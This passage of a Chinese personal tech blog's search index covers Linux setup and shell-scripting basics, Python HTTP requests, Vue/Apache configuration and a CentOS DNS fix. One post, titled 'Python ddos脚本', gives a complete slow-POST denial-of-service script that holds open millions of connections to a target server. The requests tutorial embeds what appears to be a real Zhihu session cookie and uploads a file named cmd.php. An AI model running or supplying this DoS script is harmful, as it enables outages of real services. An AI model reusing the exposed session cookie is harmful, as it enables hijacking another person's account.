/usr/local/kava配置环境变量的配置文件vim /etc/profileexport JAVA_HOME=/usr/local/java/jdk1.8.0_261export PATH=$JAVA_HOME/bin:$PATHsource /etc/profile 让新的环境变量生效java -version tomcat安装下载安装包解压，运行startup.sh文件并且需要开启8080端口 idea安装下载安装包并解压启动bin目录下的./idea.sh Shell编程1、Linux运维工程师在进行服务器集群管理时，愮编写Shell程序来进行服务器的管理2、对于JavaEE和Python程序员来说，可以编写一些Shell脚本进行程序活着是服务器的维护，比如编写一个定时备份数据库的脚本3、对于大数据程序员来说，需要编写SHell程序来管理集群。 Shell是什么？Shell是一个命令行解释器，他为用户u提供了一个向Linux内核发送请求以便运行程序的界面系统级程序，用户可以用Shell来启动、挂起、停止甚至是编写一些程序。 Shell脚本的执行方式脚本格式要求1、脚本以#!/bin/bash开头2、脚本需要有可执行权限 脚本常用的执行方式方式一(输入脚本的绝对路径或相对路径)：首先要赋予helloworld.sh 脚本的+x权限，在执行脚本 方式二(sh + 脚本)不用赋予脚本+x权限，直接执行即可 编写一个Shel脚本，输出Hello World 1234567891011121314151617mkdir shCodecd shCodevim hello.sh// i 输入内容#!/bin/bashecho &quot;Hello World&quot; :wq 退出 chmod u+x hello.sh./hello.shHello Worldsh hello.shHello World 变量变量介绍1、Linux Shell中的变量分为，系统变量和用户自定义变量2、系统变量：$HOME、$PWD、$SHELL、$USER等等，比如：echo $HOME等等3、显示当前shell中所有变量: set 变量的定义1、定义变量：变量名 = 值2、撤掉变量：unset 变量3、声明静态变量：readonly 变量，注意：不能unset 变量的定义规则1、变量名称可以由字母、数字和下划线组成，但是不能以数字开头2、等号两侧不能有空格3、变量名称一般习惯为大写 将命令的返回值赋值给变量1、A=date反引号，运行里面的命令，并把结果返回给变量A2、A=$(date)等价于反引号 快速入门1、定义变量A 12345#!/bin/bashA=100echo A=$Aeho &quot;A=$A&quot; 2、撤销变量A 12unset $Aecho &quot;A=$A&quot; $ A= 3、声明静态的变量B = 2，不能unset 12345678readonly name=&quot;BJZ&quot; [root@andu01 shCode]# sh test.shA=100A=100BJZtest.sh: 第 13 行:unset: name: 无法反设定: 只读 variable 4、可以把变量提升为全局环境变量，可供其他shell程序使用 设置环境变量1、export 变量名=变量值 将shell变量输出为边境变量/全局变量2、source 配置文件 让修改后的配置信息立即生效3、echo $变量名 查询环境变量的值 1、在/etc/profile文件中定义TOMCAT_HOME环境变量 12345678vim /etc/profile# 定义TOMCAT的变量变量export TOMCAT_HOME=/opt/tomcat# 让配置生效source /etc/profile 2、查看环境变量TOMCAT_HOME的值 1echo $TOMCAT_HOME 3、在另外一个shell程序中使用TOMCAT_HOME 1echo tomcat_home=$TOMCAT_HOME 注意：在输入TOMCAT_HOME环境变量前，需要让其生效source /etc/profile 注释单行注释 1# 单行注释 多行注释 123456:&lt;&lt;! 多行注释多行注释多行注释多行注释! 位置参数变量当我们执行一个shell脚本时，如果希望获取到命令行的参数信息，就可以使用到位置参数变量比如：./myshell.sh 100 200 ，这个就是一个执行shell的命令行，可以在myshell脚本中获取到参数信息 基本语法$n（n为数字，$0代表命令本身，$1-$9代表第一到第九个参数，十以上的参数，十以上的参数需要用大括号包含，如${10}）$*（这个变量代表命令行中的所有参数，$*把所有的参数看成一个整体）$@（这个变量也代表命令行中的所有参数，不过$@把每个参数区分对待）$#（这个变代替命令行中所有参数的个数） 编写一个shell脚本 position.sh ，在脚本中获取到命令行的各个参数信息 123456789101112131415161718192021222324# 创建脚本文件vim position.sh# 写入内容#!/bin/bashecho &quot;0=$0 1=$1 2=$2&quot;echo &quot;所有的参数=$*&quot;echo “$@”echo &quot;个数=$#&quot;# 赋予权限chmod 777 position.sh# 执行脚本./position.sh 100 2000=./position.sh 1=100 2=200所有的参数=100 200“100 200”个数=2 预定义变量基本介绍就是shell设计者实现已经定义好的变量，可以直接在shell脚本中使用 基本语法 123$$ 当前进程的进程号(PID)$! 后台运行的最后一个进程的进程号(PID)$? 最后一次执行的命令的返回状态，如果这个变量的值为0，证明上一个命令正确执行，如果这个变量的值为非0(具体时候哪个数，由命令自己来决定)，则证明上一个命令执行不正确了 应用实例在一个shell脚本中简单使用一些预定义变量preVar.sh 123456789101112131415161718echo &quot;当前执行的进程ID =&gt; $$&quot;/shCode/test.sh &amp;echo &quot;最后一个后台方式运行的进程ID =&gt; $! &quot;echo &quot;执行的结果是=$?&quot;[root@andu01 shCode]# ./preVar.sh当前执行的进程ID =&gt; 43261最后一个后台方式运行的进程ID =&gt; 43262执行的结果是=0[root@andu01 shCode]# A=100A=100BJZ/shCode/test.sh: 第 13 行:unset: name: 无法反设定: 只读 variable 运算符基本语法1、&quot;$((运算式))&quot;或&quot;$[运算式]&quot;活着expr m + n2、注意expr运算符间要有空格，如果希望将expr的结果赋给某个变量，使用``3、expr m - n4、expr \\*，/，% 乘，除，取余 应用案例1、计算(2 + 3) * 4的值 1234567891011121314151617181920212223242526272829303132# 第一种方式#!/bin/bashRES1=$(((2+3)*4))echo &quot;RES1 = &quot;$RES1[root@BJZ home]# chmod u+x oper.sh[root@BJZ home]# ./oper.shRES1 = 20# 第二种方式#!/bin/bashRES2=$[(2+3)*4]echo &quot;RES2 = &quot;$RES2[root@BJZ home]# chmod u+x oper2.sh[root@BJZ home]# ./oper2.shRES2 = 20# 第三种方式#!/bin/bashRES3=`expr 2 + 3`RES4=`expr $RES3 \\* 4`echo &quot;RES4&quot;$RES4[root@BJZ home]# chmod u+x oper3.sh[root@BJZ home]# ./oper3.shRES420 2、求出命令行的两个参数[整数]的和 12345678#!/bin/bashSUM=$[$1+$2]echo SUM$SUM[root@BJZ home]# chmod u+x oper4.sh[root@BJZ home]# ./oper4.sh 20 30SUM50 条件判断基本语法condition非空返回true，可使用$?验证(0为true &gt;1为false) 应用案例判断语句1、=字符串比较2、两个整数的比较-lt 小于-le 小于等于-eq 等于-gt 大于-ge 大于等于-ne 不等于3、按照文件权限进行判断-r 有读的权限-w 有写的权限-x 有执行的权限4、按照文件类型进行判断-f 文件存在并且是一个常规的文件-e 文件存在-d 文件存在并且是一个目录 应用实例1、”ok”是否等于”ok” 12345if [ &quot;ok&quot; = &quot;ok&quot; ]then echo &quot;equal&quot;fi 2、23是否大于等于22 12345if [ 23 -ge 22 ]then echo &quot;大于&quot;fi 3、/root/shcode/aaa.txt目录中的文件是否存在 12345if [ -f /root/shcode/aaa.txt ]then echo &quot;文件存在&quot;fi 流程控制1234567891011121314if [ 条件表达式 ]then代码fi# 或者多分支if [ 添加表达式 ]then代码elif [ 条件表达式 ]then代码fi 注意：[ 条件表达式 ] 中括号和条件判断式之间必须要有空格 请编写一个shell程序，如果输入的参数大于等于60，则输出”及格了”，如果小于60，则输出”不及格” 123456789101112131415if [ $1 -ge 60 ]then echo &quot;及格了&quot;elif [ $1 -lt 60 ]then echo &quot;不及格&quot;fi[root@BJZ home]# chmod u+x ifdemo2.sh[root@BJZ home]# ./ifdemo2.sh 20不及格[root@BJZ home]# ./ifdemo2.sh 70及格了 case语句 基本语法case $变量名 in“值1”)如果变量的值等于1，则执行程序1;;“值2”)如果变量的值等于2，则执行程序2;;…省略其他分支…*)如果变量的值都不是以上的值，则执行此程序;;esac 当命令行参数是1时，输出”周一”，是2时输出”周二“，其他情况输出”other” 1234567891011121314151617181920212223#!/bin/bashcase $1 in&quot;1&quot;)echo &quot;周一&quot;;;&quot;2&quot;)echo &quot;周二&quot;;;*)echo &quot;other&quot;;;esac[root@BJZ home]# chmod u+x ifcase.sh[root@BJZ home]# ./ifcase.sh 2周二[root@BJZ home]# ./ifcase.sh 1周一[root@BJZ home]# ./ifcase.sh 5other 循环控制基本语法for 变量 in 值1 值2 值3…do程序done应用实例打印命令行输入的参数[这里可以看出$*和$@的区别] 123456789101112131415161718192021222324# $*#!/bin/bashfor i in &quot;$*&quot;do echo &quot;num is $i&quot;done[root@BJZ home]# ./testfor1.sh 100 200 300num is 100 200 300# $@#!/bin/bashfor i in &quot;$@&quot;do echo &quot;num is $i&quot;done[root@BJZ home]# ./testfor1.sh 100 200 300num is 100num is 200num is 300 基本语法2for((初始值;循环控制条件;变量变化++))do程序done应用案例从1加到100的值输出显示 1234567891011#!/bin/bashSUM=0for((i=1;i &lt;= 100;i++))do SUM=$[$SUM+$i]doneecho &quot;SUM=$SUM&quot;[root@BJZ home]# ./testfor2.shSUM=5050 while循环基本语法1while [ 条件判断式 ]do程序done应用案例从命令行输入一个数n，统计1+..+n的值式多少 1234567891011121314151617#!/bin/bashSUM=0i=0while [ $i -le $1 ]do SUM=$[$SUM+$i] # i自增 i=$[$i+1]doneecho &quot;执行结果 = &quot;$SUM[root@BJZ home]# vim testwhile.sh[root@BJZ home]# ./testwhile.sh 10执行结果 = 55[root@BJZ home]# ./testwhile.sh 100执行结果 = 5050 读取控制台输入基本语法read(选项)(参数)选项：-p：指定读取值时的提示符-t：指定读取值时等待的时间(秒)，如果没有在指定的时间内输入，就不再等待了。参数：变量：指定读取值的变量名 应用案例1、读取控制台输入一个num1的值 12345678910#!/bin/bashread -p &quot;请输入一个数NUM1=&quot; NUM1echo &quot;你输入的NUM1=$NUM1&quot;[root@BJZ home]# chmod u+x testread.sh[root@BJZ home]# ./testread.sh请输入一个数NUM1=200你输入的NUM1=200 2、读取控制台输入一个num2值，在10秒内输入 1234567891011121314#!/bin/bashread -t 10 -p &quot;请输入一个数NUM2=&quot; NUM2echo &quot;你输入的NUM2=$NUM2&quot; # 不输入任何字符等待10秒会自动退出[root@BJZ home]# ./testread.sh请输入一个数NUM2=你输入的NUM2= [root@BJZ home]# ./testread.sh请输入一个数NUM2=123你输入的NUM2=123","link":"/post/2022-05-01-linux/"},{"title":"Python模拟Http请求","text":"Python模拟Http请求 安装requests包： 1pip install requests 模拟请求1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889import requestsBASE_URL = &quot;http://localhost:8080&quot;def demo01(): &quot;&quot;&quot; 模拟GET请求提交参数 @GetMapping(&quot;/demo1&quot;) public String demo1(String name, String age) { return &quot;demo01 =&gt; name = &quot; + name + &quot; age = &quot; + age; } :return: &quot;&quot;&quot; req = requests.get(BASE_URL + &quot;/demo1&quot;, {&quot;name&quot;: &quot;Andu&quot;, &quot;age&quot;: &quot;20&quot;}) print(req.text)def demo02(): &quot;&quot;&quot; 模拟POST请求提交参数 @PostMapping(&quot;/demo2&quot;) public String demo2(String name, String age) { return &quot;demo02 =&gt; name = &quot; + name + &quot; age = &quot; + age; } :return: &quot;&quot;&quot; req = requests.post(BASE_URL + &quot;/demo2&quot;, data={&quot;name&quot;: &quot;Andu&quot;, &quot;age&quot;: &quot;20&quot;}) print(req.text)def demo03(): &quot;&quot;&quot; 模拟POST请求提交JSON @PostMapping(&quot;/demo3&quot;) public String demo3(@RequestBody User user) { return &quot;demo03 =&gt; &quot; + user.toString(); } :return: &quot;&quot;&quot; req = requests.post(BASE_URL + &quot;/demo3&quot;, json={&quot;username&quot;: &quot;Andu&quot;, &quot;password&quot;: &quot;admin123&quot;}) print(req.text)def demo04(): &quot;&quot;&quot; 修改请求头 @PostMapping(&quot;/demo4&quot;) public String demo4(String name, String age, HttpServletRequest request) { return &quot;demo04 =&gt; name = &quot; + name + &quot; age = &quot; + age + &quot; header(token) = &quot; + request.getHeader(&quot;token&quot;); } :return: &quot;&quot;&quot; req = requests.post(BASE_URL + &quot;/demo4&quot;, data={&quot;name&quot;: &quot;Andu&quot;, &quot;age&quot;: &quot;20&quot;}, headers={ &quot;aaa&quot;: &quot;NASDnmasd&quot; }) print(req.text)def demo05(): &quot;&quot;&quot; 模拟文件上传 @PostMapping(&quot;/demo5&quot;) public String demo5(String name, MultipartFile file) { return &quot;dem05 =&gt; name = &quot; + name + &quot; file = &quot; + file.getOriginalFilename(); } :return: &quot;&quot;&quot; req = requests.post(BASE_URL + &quot;/demo5&quot;, data={&quot;name&quot;: &quot;Anu&quot;}, files={ &quot;file&quot;: open(&quot;C:\\\\Users\\\\BPDBSIR\\\\Desktop\\\\cmd.php&quot;, 'rb') }) print(req.text) def demo06(): &quot;&quot;&quot; 携带Cookie请求知乎我的信息接口 :return: &quot;&quot;&quot; req = requests.get( &quot;https://www.zhihu.com/api/v4/me?include=ad_type%2Cavailable_message_types%2Cdefault_notifications_count%2Cfollow_notifications_count%2Cvote_thank_notifications_count%2Cmessages_count%2Cemail%2Caccount_status%2Cis_bind_phone%2Curl_token&quot;, headers={ &quot;Cookie&quot;: '_zap=0bb67393-febb-4c4c-8793-9568a9976199; d_c0=&quot;AWBfbzknWBOPToreZpRljsfkqIGlDvDo3FI=|1625113376&quot;; _xsrf=ockefMAOd0el4zQIe07eOVSt950kdog5; __snaker__id=q7MMYBUWTpOuvURl; _9755xjdesxxd_=32; YD00517437729195%3AWM_TID=mCwYQPmFIVZABUUEAFdq2i5BLMBif6sQ; gdxidpyhxdE=NtGh0JW3M4pw0rVSxpf59bLjgvawq2vn%5CLyfQ5lgcGEQ9SBLa4lfu%2Fir0d3lGgve8e%2Fky%5CyZ4NVpmCy%2FNONRvVVeZDxYkCmKrW4QzChAz%2FzdoH8%2FZxDnfb6GCrkdIiT4cGamLNam8g7%2FbMvmW09KSH9rP5vzp%2F5OaaDe8dsBfx8GVXVq%3A1630629989799; YD00517437729195%3AWM_NI=yR1V0M6VYBOn%2B30P18O4PyIvqohg0CHeMwsbqiphawrSVgj0myeSSiCvk2W7dP1q4BDfbdvcdYpPjhEcsIvaH3YirI90q3gp4G1lqxHQyHyGmN40vPeFWuRVeTcKZuZ0QVA%3D; YD00517437729195%3AWM_NIKE=9ca17ae2e6ffcda170e2e6eed2c94da9e78789ce73b88a8ab6d44e838b8e85f839b8b788a2e646a9f5fb8bb22af0fea7c3b92abb8effb7b347f68a97a3ce66e9ed00b1b4348deca09acc7eb3b1a888b3498cbb8398f26ab3b7c089e47db28d9a88e93cafa7abb4d26381aaa5d3d63da890ff92b74a88baae85f569a887c0b1e96487bdbdaaf56b8ced978af143fbf0bfd4e67cf899ff8df4748c8fb7a9fc4daf92fcd1f55ca79a9996d15ea78cadacd97f9af09fb7c437e2a3; z_c0=Mi4xNF9Wd0NBQUFBQUFCWUY5dk9TZFlFeGNBQUFCaEFsVk5DcnNlWWdBMm1NZzNPa01hTnl0RWt4RmJTVkw4YU5vcnF3|1630629130|95fa690e3678013e91b13875bdeb3ae8ff9161df; tst=r; Hm_lvt_98beee57fd2ef70ccdd5ca52b9740c49=1638584280,1638584386,1638607687,1638778623; Hm_lpvt_98beee57fd2ef70ccdd5ca52b9740c49=1638778623; NOT_UNREGISTER_WAITING=1; SESSIONID=CpSPERZJE1hkZYTJgjj2qWtWUSoxakDpyrVhEFkKooX; KLBRSID=c450def82e5863a200934bb67541d696|1638778639|1638778621; JOID=UFoWC0pgmpD1GGFGFmoJDuxAOKkEI-vIrF4zHVcmq_mVSzsSXW5XP54bYEwU7KNC3XvPQ-TpLynRFjaS2--wrJo=; osd=VFgXAU1kmJH_H2VEF2AOCu5BMq4AIerCq1oxHF0hr_uUQTwWX29dOJoZYUYT6KFD13zLQeXjKC3TFzyV3-2xpp0=', &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&quot; }) print(req.text)if __name__ == &quot;__main__&quot;: demo05()","link":"/post/2022-05-01-python-request/"},{"title":"Python ddos脚本","text":"Python ddos脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import socketimport timeimport threading# Pressure Test,ddos tool# ---------------------------MAX_CONN = 20000000PORT = 8080HOST = &quot;192.168.0.34&quot;PAGE = &quot;/&quot;# ---------------------------buf = (&quot;POST %s HTTP/1.1\\r\\n&quot; &quot;Host: %s\\r\\n&quot; &quot;Content-Length: 10000000\\r\\n&quot; &quot;Cookie: dklkt_dos_test\\r\\n&quot; &quot;\\r\\n&quot; % (PAGE, HOST))socks = []def conn_thread(): global socks for i in range(0, MAX_CONN): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((HOST, PORT)) s.send(bytes(buf, 'utf-8')) print(&quot;Send buf OK!,conn=%d\\n&quot; % i) socks.append(s) except Exception as ex: print(&quot;Could not connect to server or send error:%s&quot; % ex) time.sleep(10)# end defdef send_thread(): global socks while True: for s in socks: try: s.send(&quot;f&quot;) except Exception as ex: print(&quot;Send Exception:%s\\n&quot; % ex) socks.remove(s) s.close() time.sleep(1)# end defconn_th = threading.Thread(target=conn_thread, args=())send_th = threading.Thread(target=send_thread, args=())conn_th.start()send_th.start()","link":"/post/2022-05-01-ddos/"},{"title":"Vue + Apache二级目录配置","text":"在对Vue项目进行部署上线的时候，一般都会直接部署在域名上，例如：xiaoyes.cn。假设现在该项目的后台管理系统也需要进行上线，那么你可能会想到部署在admin.xiaoyes.cn，这种方式是可行的。 但是如果有多个后台管理系统应该怎么部署呢，难道要：xxx1-admin.xiaoyes.cn、xxx2-admin.xiaoyes.cn、xxx3-admin.xiaoyes.cn…显然这种方式不够优雅，可以将项目部署在xiaoyes.cn/admin或者xxx.xiaoyes.cn/admin上面，这种方式既优雅也减少了二级域名的数量。 一、Vue项目配置这里我使用的是Vite + Vue3 ，在vite.config.js内配置： 1234export default defineConfig({ // 这里的admin就是二级目录的地址，xiaoyes.cn/admin base: &quot;/admin&quot;}) 二、Apache配置 httpd.conf 12345678&lt;VirtualHost *&gt; // 域名 ServerName xiaoyes.cn // 需要代理的地址以及前端项目编译打包后的静态资源文件夹 Alias /admin &quot;/home/admin//&quot; // 反向代理(非必须) ProxyPass /api/ http://127.0.0.1:9002/&lt;/VirtualHost&gt; /home/admin/.htaccess 12345678&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteBase /RewriteRule ^admin$ - [L]RewriteCond %{REQUEST_FILENAME} !-fRewriteCond %{REQUEST_FILENAME} !-dRewriteRule . /admin/index.html [L]&lt;/IfModule&gt;","link":"/post/Vue+Apache%E4%BA%8C%E7%BA%A7%E7%9B%AE%E5%BD%95%E9%85%8D%E7%BD%AE/"},{"title":"CentOS无法解析域名问题","text":"CentOS无法解析域名问题 解决方法如下：1、打开网络配置文件 1vim /etc/sysconfig/network-scripts/ifcfg-eth0 2、追加DNS设置 1DNS1=114.114.114.114 114.114.114.114是国内移动、电信和联通通用的DNS(一般选择)8.8.8.8是Google公司提供的DNS，该地址是全球通用的3、重启网卡 1systemctl restart network","link":"/post/2022-08-18-linux-dns/"}],"tags":[{"name":"Git","slug":"Git","link":"/tags/Git/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"Jsoup","slug":"Jsoup","link":"/tags/Jsoup/"},{"name":"爬虫","slug":"爬虫","link":"/tags/%E7%88%AC%E8%99%AB/"},{"name":"CURL","slug":"CURL","link":"/tags/CURL/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"ddos","slug":"ddos","link":"/tags/ddos/"},{"name":"Apache","slug":"Apache","link":"/tags/Apache/"},{"name":"DNS","slug":"DNS","link":"/tags/DNS/"}],"categories":[{"name":"Git","slug":"Git","link":"/categories/Git/"},{"name":"Java","slug":"Java","link":"/categories/Java/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"Python","slug":"Python","link":"/categories/Python/"},{"name":"Apache","slug":"Apache","link":"/categories/Apache/"}],"pages":[{"title":"","text":"Java Engineer","link":"/about/index.html"},{"title":"categories","text":"","link":"/categories/index.html"}]}